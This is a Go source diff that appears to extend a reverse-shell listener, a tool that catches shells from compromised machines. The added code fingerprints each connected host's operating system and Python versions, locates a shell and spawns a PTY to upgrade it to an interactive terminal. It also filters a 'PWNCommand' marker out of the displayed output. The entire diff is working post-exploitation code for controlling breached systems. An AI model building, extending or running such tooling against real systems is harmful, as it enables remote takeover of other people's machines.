@@ -120,6 +120,32 @@ func connectionThread(destPort string, clients map[int]*Socket) {
 		// Handle connections in a new goroutine.
 		fmt.Println("[+] Got connection from <", con.RemoteAddr().String(), ">, Session ID:", sessionId)
 		socket := &Socket{sessionId: sessionId, con: con}
+		
+		// Create system detector
+		detector := NewSystemDetector(con)
+		
+		// Detect OS
+		socket.osType = detector.DetectOS()
+		fmt.Println("[+] Session "+strconv.Itoa(sessionId)+" detected OS: "+socket.osType)
+
+		// Check for Python versions if it's a Unix-like system
+		if socket.osType == "Linux" || socket.osType == "macOS" {
+			socket.pythonVersions = detector.DetectPythonVersions()
+			
+			if len(socket.pythonVersions) > 0 {
+				fmt.Println("[+] Checking for shell availability...")
+				availableShell := detector.DetectShell()
+				fmt.Println("[-] Found shell:", availableShell)
+				
+				if availableShell != "" {
+					detector.SpawnPTY(socket.pythonVersions, availableShell)
+				}
+			}
+		}
+		
+		// Reset read deadline
+		con.SetReadDeadline(time.Time{})
+		
 		clients[sessionId] = socket
 		sessionId = sessionId + 1
 	}
@@ -133,11 +159,12 @@ type Socket struct {
 	con          net.Conn
 	isBackground bool
 	isClosed     bool
+	osType       string
+	pythonVersions []string
 }
 
 func (s *Socket) interact() {
 	if !s.isClosed {
-		fmt.Printf("[!] Session %d was closed! \n", s.sessionId)
 		s.isBackground = false
 
 		fmt.Printf("[+] Interact with Session ID: %d \n", s.sessionId)
@@ -188,6 +215,10 @@ func (s *Socket) copyFromConnection(src io.Reader, dst io.Writer) <-chan int {
 					s.isClosed = true
 				}
 				break
+			}
+			// Not print to stdout if PWN_COMMAND is found
+			if strings.Contains(string(buf[0:nBytes]), PWNCommand) {
+				continue
 			}
 			_, err = dst.Write(buf[0:nBytes])
 			if err != nil && !s.isClosed {
